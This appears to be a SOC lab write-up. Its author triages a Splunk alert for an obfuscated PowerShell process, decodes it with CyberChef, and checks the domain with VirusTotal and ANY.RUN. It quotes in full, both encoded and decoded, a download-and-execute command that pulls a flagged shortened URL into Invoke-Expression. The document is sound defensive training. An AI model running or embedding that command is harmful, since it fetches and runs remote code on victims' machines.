
<h1>SOC-Lab-Incident-report </h1>

 

<h2>Introduction/Description</h2>
This project involves a virtual lab SOC event simulation that I created. In this lab, I was presented with log data intentionally designed to trigger an alert on the SIEM tool (Splunk) running on my network. Using snapshots of the data and tools, I will guide you through my thought process on how I triaged this entire event.
<br />


<h2>Languages and Utilities Used</h2>

- <b>PowerShell</b>
- <b>Splunk</b>
- <b>Linux VM</b>
- <b>Windows sandbox vm</b>
- <b>ANY.RUN(Sand Box Tool)</b>
- <b>Virus Total</b>
- <b>Cyber Chef</b>
<h2>Environments Used </h2>

- <b>Windows 7 sandbox VM</b>
- <b>Linux VM </b>


<h2>Program walk-through:</h2>

<p align="left">
 
## SPLUNK EVENT ALERT:
<img src="https://i.imgur.com/TtKAjut.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
 <br />As displayed in the Splunk window, this is the event triggered by the alert we received. The alert I received pertains to the execution of a process that is obfuscated. In the Splunk event viewer, you can observe information such as the time and date of the event, event ID, name of the user, username login of the user, type of ingested log data, and more. 
<br />

## SPLUNK EVENT ALERT :
<img src="https://i.imgur.com/258BqEd.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
 
<br />As you scroll down in the event viewer window in splunk you are given more information about the event. Here you can see the process information such as the "Creator process name"= C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe and the "Process Command line": "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"-enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADAATQB3ADkAdwAiACkA. This obfuscated command line is what caused our alert in splunk and is what we are going to be investigating. :
<br />



## CYBER CHEF: <br/>
<img src="https://imgur.com/YPxZFGM.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br /> As you examine the process command line, you can observe that it is obfuscated. Following the ".exe," which represents the execution process, you can see the presence of "-enc" to encode the actual execution. To understand what the process command line is attempting to do, it's necessary to decode it and assess its potential malicious nature. In this instance, I utilized a decryption tool called CyberChef. The output result reveals "iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")", which essentially directs a user to the specified URL, allowing them to download contents from the listed URL.
<br />

## VIRUS TOTAL REPORT:  <br/>
<img src="https://i.imgur.com/TalzEiR.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br /> Continuing with this investigation, we can already identify suspicious activity on the network. Firstly, the process command line was obfuscated. Secondly, we discovered that the execution of the process command line directs the user to a URL, enabling them to download unknown files. The next step in our investigation involves checking whether the website from the process is malicious or not. I accomplished this using a tool called VirusTotal, and the results confirmed that the website is indeed malicious. The report provided a score of 11/90, signifying that 11 security vendors have flagged this domain name as malicious. 

<br />
 
 ## INVESTIGATION REPORT: <br/>
<img src="https://imgur.com/pTrCtro.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br /> After triaging this event and confirming that it is a malicious act on the network, I proceeded to create an investigation report. In a real-life scenario, this report would be sent to the incident response team in my SOC..
<br />

## SANDBOX RESULTS:  <br/>
<img src="https://imgur.com/xHssB4C.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>  
<br /> Upon completing my investigation report on the incident, I decided to conduct some analysis on the malicious domain using a sandbox tool called ANY.RUN. What I discovered about this malicious domain is that when you visit the site, there are connections to various IP addresses located outside of the United States. Further investigation with VirusTotal revealed that some of these IP addresses with connections have been marked as malicious.

Moreover, additional research uncovered that some of the IP addresses not marked as malicious have connections and communications with malicious files. Below is one example of a malicious file associated with an IP address originating from Germany. This IP address was also establishing connections to the same domain investigated in my report. This represents one of the IP addresses that were either marked as malicious or reported on VirusTotal as having connections and communications with malicious files.
<br />
<img src="https://imgur.com/ElTze1c.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>


## SAND BOX THREAT ALERTS:  <br/>
<img src="https://imgur.com/5ffb460.png" height="80%" width="80%" alt="Disk Sanitization Steps"/> <br/> Towards the end of my analysis, I wasn't able to identify any actual attacks on the system. However, I did uncover a significant amount of suspicious activity occurring when a user visited that domain. The only threat alert I found on the sandbox was a potentially bad traffic alert. This alert also triggered the iexplore.exe process, potentially granting the malicious actor access to engage in phishing activities while a user is on that domain.

I would recommend the incident response team to conduct a more comprehensive analysis since that is their area of specialization..

#### Utilizing Computer Incident Handling Guide
<img src="https://imgur.com/5wt02wN.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>


<h2>NIST INCIDENT CYCLE</h2>

 
 - <b> PREPARATION: In preparation for this lab, I configured my SIEM TOOL Splunk. I also ensured that the alert for an obfuscated process command line was included in my list of alerts. The last thing I had to do was ingest this specific log data to trigger the alert on my Splunk. </b>
- <b> DETECTION/ANALYSIS: The detection portion of this lab was all done through my splunk tool. As soon as the requirements for the alert were met it notified me immediately on my SIEM tool. The detection phase of this lab was conducted entirely through my Splunk tool. As soon as the requirements for the alert were met, it notified me immediately on my SIEM tool. The analysis portion involved hands-on interaction with the event in Splunk. This included decrypting the obfuscated process using the CyberChef tool. Additional analysis during my investigation involved scanning the domain obtained from the process. As shown in the lab, I used VirusTotal to confirm that the domain is malicious. Further analysis included a deeper investigation of the confirmed malicious domain in the sandbox tool ANY.RUN. </b>
- <b> CONTAINMENT ERADICATION AND RECOVERY: The steps taken for containment, eradication, and recovery depend on the organization's methods and policies. A general overview would involve disconnecting the computer from the network for containment. For eradication, it could range from running anti-malware and virus programs to locate malicious files and remove them. For recovery this could possibly be reimaging the computer's operating system and reinstalling it, depending on the severity of the host infection.

 </b>
- <b> POST INCIDENT ACTIVITY: In this example scenario, a user processed an obfuscated command on their host computer that led to a malicious domain. With proper investigation, we were able to gather information about the malicious activity on the network. All documented information would be shared with all stakeholders within the company where remediation and prevention techniques can be implemented for incidents like this or similar scenarios. In conclusion, post-incident activity serves as an informative lesson on handling malicious events.  </b>


</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>

